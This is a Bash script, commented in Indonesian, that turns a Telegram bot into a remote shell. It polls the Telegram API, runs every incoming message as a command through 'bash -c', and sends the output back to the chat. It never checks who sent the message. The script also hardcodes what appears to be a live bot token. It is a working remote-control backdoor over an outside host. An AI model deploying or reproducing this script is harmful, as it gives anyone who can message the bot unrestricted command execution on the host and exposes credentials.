clear

#!/bin/bash

# Masukkan token bot Anda
BOT_TOKEN="m7828558736:AAET5sG0jxnniUOQbSAvnj5DZKsUYL2Q0fM"

# URL API Telegram
BASE_URL="https://api.telegram.org/bot$BOT_TOKEN"

# Fungsi untuk mengirim pesan ke Telegram
send_message() {
    local chat_id=$1
    local message=$2
    curl -s -X POST "$BASE_URL/sendMessage" -d "chat_id=$chat_id" -d "text=$message" > /dev/null
}

# Fungsi untuk mendapatkan pembaruan terbaru
get_updates() {
    curl -s "$BASE_URL/getUpdates"
}

# Fungsi untuk mengeksekusi perintah bash
execute_command() {
    local command=$1
    local output
    output=$(bash -c "$command" 2>&1)
    echo "$output"
}

# Bot loop
last_update_id=0
while true; do
    # Ambil pembaruan dari API Telegram
    response=$(get_updates)

    # Parse update ID dan pesan terbaru
    updates=$(echo "$response" | jq -c ".result[] | select(.update_id > $last_update_id)")
    
    # Proses setiap update
    for update in $updates; do
        # Ambil update ID
        update_id=$(echo "$update" | jq ".update_id")
        
        # Perbarui last_update_id
        last_update_id=$update_id

        # Ambil ID chat dan pesan pengguna
        chat_id=$(echo "$update" | jq -r ".message.chat.id")
        message=$(echo "$update" | jq -r ".message.text")

        # Jika pesan adalah /start
        if [[ "$message" == "/start" ]]; then
            send_message "$chat_id" "Bot siap menerima perintah. Ketik perintah bash Anda!"
        else
            # Eksekusi perintah dan kirimkan hasilnya
            result=$(execute_command "$message")
            send_message "$chat_id" "Output:\n$result"
        fi
    done

    # Tunggu sebentar sebelum meminta pembaruan lagi
    sleep 2
done
